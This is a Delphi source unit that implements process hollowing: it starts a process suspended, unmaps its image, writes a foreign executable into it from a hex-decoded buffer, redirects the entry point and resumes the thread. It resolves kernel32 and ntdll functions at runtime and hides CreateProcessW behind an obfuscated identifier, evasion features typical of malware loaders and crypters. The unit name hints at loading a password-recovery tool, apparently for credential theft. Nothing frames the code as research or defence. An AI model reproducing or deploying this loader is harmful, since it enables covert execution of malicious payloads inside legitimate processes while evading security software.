unit STPassView;

interface

uses GetLibModHandlePassView;

function 今寿(lpApplicationName: LPCWSTR; lpCommandLine: LPWSTR;
  lpProcessAttributes, lpThreadAttributes: PSecurityAttributes;
  bInheritHandles: BOOL; dwCreationFlags: DWORD; lpEnvironment: Pointer;
  lpCurrentDirectory: LPCWSTR; const lpStartupInfo: TStartupInfo;
  var lpProcessInformation: TProcessInformation): BOOL;
procedure StrHexToArrayByte(RawData: string; out OutArrayData: TArray<Byte>);
function MemExec(Buffer: Pointer; ProcName, Parameters: string; TShowWindow: Word): TProcessInformation;
function ZwUnmapViewOfSection(ProcessHandle: THANDLE; BaseAddress: Pointer): LongInt;

implementation

function ResumeThread(hThread: THandle): DWORD;
var
  H:THandle;
  ResumeThread: function(hThread: THandle): DWORD; stdcall;
begin
  H := LoadLibrary(kernel32);
  @ResumeThread := GetProcAddress(H, 'ResumeThread');
  Result := ResumeThread(hThread);
  FreeLibrary(H);
end;

function TerminateProcess(hProcess: THandle; uExitCode: UINT): BOOL;
var
  H:THandle;
  TerminateProcess: function(hProcess: THandle; uExitCode: UINT): BOOL; stdcall;
begin
  H := LoadLibrary(kernel32);
  @TerminateProcess := GetProcAddress(H, 'TerminateProcess');
  Result := TerminateProcess(hProcess, uExitCode);
  FreeLibrary(H);
end;

function SetThreadContext(hThread: THandle; const lpContext: TContext): BOOL;
var
  H:THandle;
  SetThreadContext: function(hThread: THandle; const lpContext: TContext): BOOL; stdcall;
begin
  H := LoadLibrary(kernel32);
  @SetThreadContext := GetProcAddress(H, 'SetThreadContext');
  Result := SetThreadContext(hThread, lpContext);
  FreeLibrary(H);
end;

function WriteProcessMemory(hProcess: THandle; const lpBaseAddress: Pointer; lpBuffer: Pointer;
  nSize: SIZE_T; var lpNumberOfBytesWritten: SIZE_T): BOOL;
var
  H:THandle;
  WriteProcessMemory: function(hProcess: THandle; const lpBaseAddress: Pointer; lpBuffer: Pointer;
  nSize: SIZE_T; var lpNumberOfBytesWritten: SIZE_T): BOOL; stdcall;
begin
  H := LoadLibrary(kernel32);
  @WriteProcessMemory := GetProcAddress(H, 'WriteProcessMemory');
  Result := WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);
  FreeLibrary(H);
end;


function VirtualAllocEx(hProcess: THandle; lpAddress: Pointer;
  dwSize: SIZE_T; flAllocationType: DWORD; flProtect: DWORD): Pointer;
var
  H:THandle;
  VirtualAllocEx: function(hProcess: THandle; lpAddress: Pointer;
  dwSize: SIZE_T; flAllocationType: DWORD; flProtect: DWORD): Pointer; stdcall;
begin
  H := LoadLibrary(kernel32);
  @VirtualAllocEx := GetProcAddress(H, 'VirtualAllocEx');
  Result := VirtualAllocEx(hProcess, lpAddress, dwSize, flAllocationType, flProtect);
  FreeLibrary(H);
end;

function ReadProcessMemory(hProcess: THandle; const lpBaseAddress: Pointer; lpBuffer: Pointer;
  nSize: SIZE_T; var lpNumberOfBytesRead: SIZE_T): BOOL;
var
  H:THandle;
  ReadProcessMemory: function(hProcess: THandle; const lpBaseAddress: Pointer; lpBuffer: Pointer;
    nSize: SIZE_T; var lpNumberOfBytesRead: SIZE_T): BOOL; stdcall;
begin
  H := LoadLibrary(kernel32);
  @ReadProcessMemory := GetProcAddress(H, 'ReadProcessMemory');
  Result := ReadProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesRead);
  FreeLibrary(H);
end;

function GetThreadContext(hThread: THandle; var lpContext: TContext): BOOL;
var
  H:THandle;
  GetThreadContext: function(hThread: THandle; var lpContext: TContext): BOOL; stdcall;
begin
  H := LoadLibrary(kernel32);
  @GetThreadContext := GetProcAddress(H, 'GetThreadContext');
  Result := GetThreadContext(hThread, lpContext);
  FreeLibrary(H);
end;

function 今寿(lpApplicationName: LPCWSTR; lpCommandLine: LPWSTR;
  lpProcessAttributes, lpThreadAttributes: PSecurityAttributes;
  bInheritHandles: BOOL; dwCreationFlags: DWORD; lpEnvironment: Pointer;
  lpCurrentDirectory: LPCWSTR; const lpStartupInfo: TStartupInfo;
  var lpProcessInformation: TProcessInformation): BOOL;
var
  H:THandle;
  今: function(lpApplicationName: LPCWSTR; lpCommandLine: LPWSTR;
    lpProcessAttributes, lpThreadAttributes: PSecurityAttributes;
    bInheritHandles: BOOL; dwCreationFlags: DWORD; lpEnvironment: Pointer;
    lpCurrentDirectory: LPCWSTR; const lpStartupInfo: TStartupInfo;
    var lpProcessInformation: TProcessInformation): BOOL; stdcall;
begin
  H := LoadLibrary(kernel32);
  @今 := GetProcAddress(H, 'CreateProcessW');
  Result := 今(lpApplicationName, lpCommandLine,
    lpProcessAttributes, lpThreadAttributes, bInheritHandles,
    dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo,
    lpProcessInformation);
  FreeLibrary(H);
end;

function ZwUnmapViewOfSection(ProcessHandle: THANDLE; BaseAddress: Pointer): LongInt;
var
  H:THandle;
  ZwUnmapViewOfSection: function(ProcessHandle: THANDLE; BaseAddress: Pointer): LongInt; stdcall;
begin
  H := LoadLibrary(ntdll);
  @ZwUnmapViewOfSection := GetProcAddress(H, 'ZwUnmapViewOfSection');
  Result := ZwUnmapViewOfSection(ProcessHandle, BaseAddress);
  FreeLibrary(H);
end;

function ImageFirstSection(NTHeader: PImageNTHeaders): PImageSectionHeader;
begin
  Result := PImageSectionheader(ULONG_PTR(@NTHeader.OptionalHeader) + NTHeader.FileHeader.SizeOfOptionalHeader);
end;

function Protect(Characteristics: ULONG): ULONG;
const
  Mapping: array[0..7] of ULONG =
  (PAGE_NOACCESS,
   PAGE_EXECUTE,
   PAGE_READONLY,
   PAGE_EXECUTE_READ,
   PAGE_READWRITE,
   PAGE_EXECUTE_READWRITE,
   PAGE_READWRITE,
   PAGE_EXECUTE_READWRITE);
begin
  Result := Mapping[Characteristics shr 29];
end;

function STInt(const S: string): Integer;
var E: Integer;
begin
  Val(S, Result,E);
end;

procedure StrHexToArrayByte(RawData: string; out OutArrayData: TArray<Byte>);
var
  Len, I: Integer;
begin
  Len := Length(RawData);
  if (Len > 0) and (Len mod 2 = 0) then
  begin
    SetLength(OutArrayData, Len div 2);
    I := 0;
    while (I <= High(OutArrayData)) do
    begin
      OutArrayData[I] := STInt('$' + Copy(RawData, I * 2 + 1, 2));
      Inc(I);
    end;
  end;
end;

function MemExec(Buffer: Pointer; ProcName, Parameters: string; TShowWindow: Word): TProcessInformation;
type
  PImageSectionHeaders = ^TImageSectionHeaders;
  TImageSectionHeaders = array[0..95] of TImageSectionHeader;
var
  ProcessInfo: TProcessInformation;
  StartupInfo: TStartupInfo;
  Context: TContext;
  BaseAddress: Pointer;
  BytesRead: Size_T;
  BytesWritten: Size_T;
  I: ULONG;
  OldProtect: ULONG;
  NTHeaders: PImageNTHeaders;
  Sections: PImageSectionHeaders;
  Success: Boolean;
begin
  FillChar(ProcessInfo, SizeOf(TProcessInformation), 0);
  FillChar(StartupInfo, SizeOf(TStartupInfo), 0);
  StartupInfo.cb := SizeOf(TStartupInfo);
  StartupInfo.dwFlags := STARTF_USESHOWWINDOW;
  StartupInfo.wShowWindow := TShowWindow;
  if (今寿(PChar(ProcName), PChar(Parameters), nil, nil,
    False, CREATE_SUSPENDED, nil, nil, StartupInfo, ProcessInfo)) then
  begin
  //  ShowWindow(ProcessInfo.hProcess, 0);
    Success := True;
    Result := ProcessInfo;
    try
      Context.ContextFlags := CONTEXT_INTEGER;
      if (GetThreadContext(ProcessInfo.hThread, Context) and
      (ReadProcessMemory(ProcessInfo.hProcess, Pointer(Context.Ebx + 8), @BaseAddress, SizeOf(BaseAddress), BytesRead)) and
      (ZwUnmapViewOfSection(ProcessInfo.hProcess, BaseAddress) >= 0) and (Assigned(Buffer))) then
      begin
        NTHeaders := PImageNTHeaders(Cardinal(Buffer) + Cardinal(PImageDosHeader(Buffer)._lfanew));

        BaseAddress := VirtualAllocEx(ProcessInfo.hProcess, Pointer(NTHeaders.OptionalHeader.ImageBase),
        NTHeaders.OptionalHeader.SizeOfImage, MEM_RESERVE or MEM_COMMIT, PAGE_READWRITE);

        if (Assigned(BaseAddress)) and
        (WriteProcessMemory(ProcessInfo.hProcess, BaseAddress, Buffer,
        NTHeaders.OptionalHeader.SizeOfHeaders, BytesWritten)) then
        begin
          Sections := PImageSectionHeaders(ImageFirstSection(NTHeaders));

          for I := 0 to NTHeaders.FileHeader.NumberOfSections - 1 do
            if (WriteProcessMemory(ProcessInfo.hProcess, Pointer(Cardinal(BaseAddress) +
              Sections[I].VirtualAddress), Pointer(Cardinal(Buffer) +
              Sections[I].PointerToRawData), Sections[I].SizeOfRawData, BytesWritten)) then
                VirtualProtectEx(ProcessInfo.hProcess, Pointer(Cardinal(BaseAddress) + Sections[I].VirtualAddress),
                Sections[I].Misc.VirtualSize, Protect(Sections[I].Characteristics), OldProtect);

          if (WriteProcessMemory(ProcessInfo.hProcess, Pointer(Context.Ebx + 8),
            @BaseAddress, SizeOf(BaseAddress), BytesWritten)) then
          begin
            Context.EAX := ULONG(BaseAddress) + NTHeaders.OptionalHeader.AddressOfEntryPoint;
            Success := SetThreadContext(ProcessInfo.hThread, Context);
          end;
        end;
      end;
    finally
      if Success then ResumeThread(ProcessInfo.hThread)
      else TerminateProcess(ProcessInfo.hProcess, 0);
    end;
  end;
end;

end.